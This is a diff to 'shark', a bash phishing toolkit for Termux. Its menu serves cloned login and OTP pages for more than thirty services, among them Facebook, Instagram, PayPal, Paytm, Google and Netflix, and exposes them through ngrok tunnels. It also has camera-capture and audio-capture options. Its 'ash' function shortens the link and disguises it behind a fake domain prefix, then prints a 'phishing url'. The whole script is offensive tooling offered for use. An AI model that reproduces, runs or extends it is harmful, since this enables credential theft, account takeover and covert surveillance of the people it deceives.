@@ -36,6 +36,8 @@ nc="\e[0m"                                                  ##
 
 VERSION="2.0.3"
 
+BIN="${PREFIX}/bin"
+
 ################
 # PRINT MESSAGE
 ################
@@ -64,7 +66,8 @@ if [ $? -eq 0 -a ! "${1}" = "--update" ] && [ $? -eq 0 -a ! "$1" = "-u" ]; then
 fi
 }
 
-function check_net() {
+
+function connection() {
         ping -c 1 google.com > /dev/null 2>&1
         if [[ "$?" != 0 ]]
         then
@@ -74,7 +77,7 @@ function check_net() {
 }
 
 function check_update() {	
-        check_net
+        connection
         version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
         if [ ${latest_version} = ${VERSION} ];then		
@@ -156,26 +159,6 @@ echo -e "\e[32m                ============================================\e[m 
 echo -e "\e[31m                [\e[32m★\e[31m]\e[93m Follow us on youtube:bhaviktutorials\e[31m [\e[32m★\e[31m]\e[m "
 echo -e "\e[32m                ============================================\e[m " 
 
-# check the internet connectivity 
-connection() {
-while :
-do
-if curl -s --head  --request GET www.google.com | grep "200 OK" > /dev/null ; then
-    echo -e "\e[1;92m>> \e[1;93m[\e[1;92m Active ●\e[1;93m ]\e[m"
-    echo 
-    sleep 3
-    break
-else
-    echo -e "\e[1;92m>> \e[1;93m[\e[1;91m Inactive ●\e[1;93m ]\e[m"
-    sleep 2
-    echo
-    echo -e "\e[1;92m>> \e[1;91mCheck your connection and Try Again!!\e[m"
-    sleep 3
-    echo
-    exit
-fi
-done
-}
 
 #shark logo
 shark_logo() {
@@ -231,7 +214,7 @@ if [ -d "/sdcard/Camera_hack" ]
 then
 echo
 else 
-mkdir /sdcard/Camera_hack
+mkdir -p /sdcard/Camera_hack
 fi
 }
 
@@ -242,20 +225,17 @@ if [ -d "/sdcard/Audio_hack" ]
 then
 echo
 else 
-mkdir /sdcard/Audio_hack
+mkdir -p /sdcard/Audio_hack
 fi
 }
 
 #catch_ip camera
 
 catch_ip() {
-
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-
 cat ip.txt >> saved.ip.txt
-
 }
 
 #spin
@@ -345,6 +325,58 @@ ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
 
+
+##### shorten #####
+ash() {
+	sleep 0.5
+	url_checker() {
+	if [ ! "${1//:*}" = http ]; then
+	if [ ! "${1//:*}" = https ]; then
+	echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
+	exit 1
+	fi
+	fi
+         }
+        echo
+	echo -e "\e[1;96m=============================================================\e[m "
+	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
+        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
+        shorter=${short#https://}
+        echo
+        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m] :\e[m ' mask
+        echo
+        url_checker $mask
+        echo -e "\e[1;96m>>\e[1;93m Enter some words you like to mention in url \e[1;92m[\e[1;92mEx.free-insta-followers\e[1;92m] \e[m "
+	sleep 1
+        echo
+	echo -e "\e[1;96m>>\e[1;91m NOTE:\e[1;93m Don't use space in your words,\e[1;92m[\e[1;91minstead use \e[1;92m'-'\e[1;91m to avoid space\e[1;92m] \e[m "
+	sleep 2
+	echo
+        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Enter your words here :\e[0m ' words
+        echo
+	sleep 3
+        final=$mask-$words@$shorter
+        echo -e "\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Your phishing url >>\e[m $final "
+	echo
+        }
+#####
+# OS
+#####
+function os () {
+if [ -e $BIN/termux-info ]; then
+		BINDIR="${PREFIX}/bin"
+	else
+	        BINDIR="/usr/bin"
+fi
+}
+
+#######
+# MAIN
+#######
+
+os
+
+
 while :
 do
 clear
@@ -391,51 +423,13 @@ echo -e "\e[1;96m===============================================================
 }
 
 banner
-echo 
-ash() {
-	sleep 0.5
-	url_checker() {
-	if [ ! "${1//:*}" = http ]; then
-	if [ ! "${1//:*}" = https ]; then
-	echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
-	exit 1
-	fi
-	fi
-         }
-        echo
-	echo -e "\e[1;96m=============================================================\e[m "
-        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
-        shorter=${short#https://}
-        echo
-        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m] :\e[m ' mask
-        echo
-        url_checker $mask
-        echo -e "\e[1;96m>>\e[1;93m Enter some words you like to mention in url \e[1;92m[\e[1;92mEx.free-insta-followers\e[1;92m] \e[m "
-	sleep 1
-        echo
-	echo -e "\e[1;96m>>\e[1;91m NOTE:\e[1;93m Don't use space in your words,\e[1;92m[\e[1;91minstead use \e[1;92m'-'\e[1;91m to avoid space\e[1;92m] \e[m "
-	sleep 2
-	echo
-        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Enter your words here :\e[0m ' words
-        echo
-	sleep 3
-        final=$mask-$words@$shorter
-        echo -e "\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Your phishing url >>\e[m $final "
-	echo
-        }
-
-ash1() {   
-        echo;      
-	echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2`
-	echo;
-}
-
+echo  
+  
         read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 	
          if [ $option = 01 ] || [ $option = 1 ]
          then
-	                    cd /data/data/com.termux/files/usr/bin/phs
-                            cd facebook/
+	                    cd $BINDIR/facebook/                            
                             echo 
 			    connection
 			    ( sleep 5 ) &> /dev/null & spin_shark
@@ -445,7 +439,7 @@ ash1() {
 			    (sleep 6) &> /dev/null & spin
 			    echo
 			    tput civis
-			    ./ngrok http 4444 > /dev/null 2>&1 & 
+			    ngrok http 4444 > /dev/null 2>&1 & 
 			    ( sleep 18 ) &> /dev/null & spinner
 			    echo 
 			    tput cnorm
@@ -467,8 +461,7 @@ ash1() {
 			     
 	 elif [ $option = 02 ] || [ $option = 2 ]
 	 then
-			   cd /data/data/com.termux/files/usr/bin/phs
-                           cd pinterest/
+			   cd $BINDIR/pinterest/                           
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -478,7 +471,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -499,8 +492,7 @@ ash1() {
 
 	 elif [ $option = 03 ] || [ $option = 3 ]
 	 then
-		           cd /data/data/com.termux/files/usr/bin/phs
-			   cd instagram/
+		           cd $BINDIR/instagram/
 			   echo 
 			   connection
 			   ( sleep 5 ) &> /dev/null & spin_shark
@@ -510,7 +502,7 @@ ash1() {
 			   (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-			   ./ngrok http 4444 > /dev/null 2>&1 &
+			   ngrok http 4444 > /dev/null 2>&1 &
 			   ( sleep 18 ) &> /dev/null & spinner
 			   echo 
 			   tput cnorm
@@ -531,8 +523,7 @@ ash1() {
 			   
 	elif [ $option = 04 ] || [ $option = 4 ]
         then
-                          cd /data/data/com.termux/files/usr/bin/phs
-			  cd UberEats-Phishing/
+                          cd $BINDIR/UberEats-Phishing/
 			  echo 
 			  connection
 			  ( sleep 5 ) &> /dev/null & spin_shark
@@ -542,7 +533,7 @@ ash1() {
 			  (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
-			  ./ngrok http 4444 > /dev/null 2>&1 &
+			  ngrok http 4444 > /dev/null 2>&1 &
 			  ( sleep 18 ) &> /dev/null & spinner
 			  echo 
 			  tput cnorm
@@ -563,8 +554,7 @@ ash1() {
 			  
         elif [ $option = 05 ] || [ $option = 5 ]
         then
-                          cd /data/data/com.termux/files/usr/bin/phs
-                          cd ola-otpbypass/
+                          cd $BINDIR/ola-otpbypass/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -574,7 +564,7 @@ ash1() {
 		          (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
-		          ./ngrok http 4444 > /dev/null 2>&1 &
+		          ngrok http 4444 > /dev/null 2>&1 &
 		          ( sleep 18 ) &> /dev/null & spinner
 		          echo 
 			  tput cnorm
@@ -595,8 +585,7 @@ ash1() {
 			  
          elif [ $option = 06 ] || [ $option = 6 ]
 	 then
-                          cd /data/data/com.termux/files/usr/bin/phs
-                          cd google-otp/
+                          cd $BINDIR/google-otp/                         
                           echo 
 			  connection
 		          ( sleep 5 ) &> /dev/null & spin_shark  
@@ -606,7 +595,7 @@ ash1() {
 		          (sleep 6) &> /dev/null & spin 
 			  echo
 			  tput civis
-		          ./ngrok http 4444 > /dev/null 2>&1 &
+		          ngrok http 4444 > /dev/null 2>&1 &
 		          ( sleep 18 ) &> /dev/null & spinner
 		          echo 
 			  tput cnorm
@@ -627,8 +616,7 @@ ash1() {
 			  
        elif [ $option = 07 ] || [ $option = 7 ]
        then
-                          cd /data/data/com.termux/files/usr/bin/phs
-                          cd Paytm-Phishing/
+                          cd $BINDIR/Paytm-Phishing/
                           echo 
                           echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Sign In \e[0m" 
 			  echo
@@ -647,7 +635,7 @@ ash1() {
                                 (sleep 6) &> /dev/null & spin
 				echo
 				tput civis
-                                ./ngrok http 4444 > /dev/null 2>&1 &
+                                ngrok http 4444 > /dev/null 2>&1 &
                                 ( sleep 18 ) &> /dev/null & spinner
                                 echo 
 				tput cnorm
@@ -676,7 +664,7 @@ ash1() {
                                 (sleep 6) &> /dev/null & spin
 				echo
 				tput civis
-                                ./ngrok http 4444 > /dev/null 2>&1 &
+                                ngrok http 4444 > /dev/null 2>&1 &
                                 ( sleep 18 ) &> /dev/null & spinner
                                 echo 
 				tput cnorm
@@ -699,8 +687,7 @@ ash1() {
         elif [ $option = 08 ] || [ $option = 8 ]
 	then
 
-                          cd /data/data/com.termux/files/usr/bin/phs
-                          cd Netflix/
+                          cd $BINDIR/Netflix/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -710,7 +697,7 @@ ash1() {
                           (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
-                          ./ngrok http 4444 > /dev/null 2>&1 &
+                          ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
 			  tput cnorm
@@ -731,8 +718,7 @@ ash1() {
 
            elif [ $option = 09 ] || [ $option = 9 ]
 	   then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd instafollow/
+                           cd $BINDIR/instafollow/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -742,7 +728,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -763,8 +749,7 @@ ash1() {
 			   
                elif [ $option = 10 ]
 	       then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd amazonsign/
+                           cd $BINDIR/amazonsign/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -774,7 +759,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -795,8 +780,7 @@ ash1() {
 
                   elif [ $option = 11 ]
 	          then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd whatsapp-phishing/
+                           cd $BINDIR/whatsapp-phishing/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -806,7 +790,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -827,8 +811,7 @@ ash1() {
 			   
 	          elif [ $option = 12 ]
 	          then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd Linkedin/
+                           cd $BINDIR/Linkedin/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -838,7 +821,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -859,8 +842,7 @@ ash1() {
    
                      elif [ $option = 13 ]
 	             then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd Hotstar-otp-bypass/
+                           cd $BINDIR/Hotstar-otp-bypass/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -870,7 +852,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -891,8 +873,7 @@ ash1() {
       
                     elif [ $option = 14 ]
 	            then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd spotify/
+                           cd $BINDIR/spotify/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -902,7 +883,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -923,8 +904,7 @@ ash1() {
 			   
 	            elif [ $option = 15 ]
 	            then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd github/
+                           cd $BINDIR/github/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -934,7 +914,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
 			   echo
 			   tput cnorm
@@ -955,8 +935,7 @@ ash1() {
 			   
 	        elif [ $option = 16 ]
 	        then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd ipfinder/
+                           cd $BINDIR/ipfinder/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -966,7 +945,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -987,8 +966,7 @@ ash1() {
 
                   elif [ $option = 17 ]
 	          then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd Zomato-Phishing/
+                           cd $BINDIR/Zomato-Phishing/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -998,7 +976,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1019,8 +997,7 @@ ash1() {
 
                    elif [ $option = 18 ]
 	           then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd phonepay/
+                           cd $BINDIR/phonepay/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1030,7 +1007,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1051,8 +1028,7 @@ ash1() {
 			   
 	            elif [ $option = 19 ]
 	            then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd paypal/
+                           cd $BINDIR/paypal/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1062,7 +1038,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1083,8 +1059,7 @@ ash1() {
            
 	            elif [ $option = 20 ]
 	            then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd telegram/
+                           cd $BINDIR/telegram/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1094,7 +1069,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1115,8 +1090,7 @@ ash1() {
 			   
 	            elif [ $option = 21 ]
 	            then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd twitter/
+                           cd $BINDIR/twitter/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1126,7 +1100,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1147,8 +1121,7 @@ ash1() {
                     
 		    elif [ $option = 22 ]
 	            then
-                          cd /data/data/com.termux/files/usr/bin/phs
-                          cd flipcart/
+                          cd $BINDIR/flipcart/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -1158,7 +1131,7 @@ ash1() {
                           (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
-                          ./ngrok http 4444 > /dev/null 2>&1 &
+                          ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
 			  tput cnorm
@@ -1179,8 +1152,7 @@ ash1() {
        
                   elif [ $option = 23 ]
 	          then
-                          cd /data/data/com.termux/files/usr/bin/phs
-                          cd wordpress/
+                          cd $BINDIR/wordpress/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -1190,7 +1162,7 @@ ash1() {
                           (sleep 6) &> /dev/null & spin
 			  echo
 			  tput civis
-                          ./ngrok http 4444 > /dev/null 2>&1 &
+                          ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
 			  tput cnorm
@@ -1211,8 +1183,7 @@ ash1() {
 			  
 	           elif [ $option = 24 ]
 	           then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd snapchat/
+                           cd $BINDIR/snapchat/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1222,7 +1193,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1243,8 +1214,7 @@ ash1() {
 			   
 		    elif [ $option = 25 ]
 	            then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd protonmail/
+                           cd $BINDIR/protonmail/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1254,7 +1224,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1275,8 +1245,7 @@ ash1() {
 
                   elif [ $option = 26 ]
 	          then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd stackoverflow/
+                           cd $BINDIR/stackoverflow/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1286,7 +1255,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1307,8 +1276,7 @@ ash1() {
 
                   elif [ $option = 27 ]
 	          then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd ebay/
+                           cd $BINDIR/ebay/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1318,7 +1286,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1339,8 +1307,7 @@ ash1() {
 
                   elif [ $option = 28 ]
 	          then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd twitch/
+                           cd $BINDIR/twitch/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1350,7 +1317,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1371,8 +1338,7 @@ ash1() {
                 
 		    elif [ $option = 29 ]
 	            then
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd ajio/
+                           cd $BINDIR/ajio/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1382,7 +1348,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1403,8 +1369,7 @@ ash1() {
 			   
 		  elif [ $option = 30 ]
 	          then               
-                           cd /data/data/com.termux/files/usr/bin/phs
-                           cd mobikwik/
+                           cd $BINDIR/mobikwik/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1414,7 +1379,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1436,8 +1401,7 @@ ash1() {
 		  elif [ $option = 31 ]
 	          then        
 		           
-		           cd /data/data/com.termux/files/usr/bin/phs
-			   cd Camera_hack
+		           cd $BINDIR/Camera_hack
 			   file_check
 			   echo
 			   clear
@@ -1490,7 +1454,7 @@ ash1() {
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                            echo 
 			   tput cnorm
@@ -1525,8 +1489,7 @@ ash1() {
 			   
 	           elif [ $option = 32 ]
 	           then 
-		            cd /data/data/com.termux/files/usr/bin/phs
-			    cd Audio_hack
+		            cd $BINDIR/Audio_hack
 		            file_check1
 			    echo
 			    default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
@@ -1545,7 +1508,7 @@ ash1() {
                             (sleep 6) &> /dev/null & spin
 			    echo
 			     tput civis
-                            ./ngrok http 4444 > /dev/null 2>&1 &
+                            ngrok http 4444 > /dev/null 2>&1 &
                             ( sleep 18 ) &> /dev/null & spinner
                              echo 
 			    tput cnorm
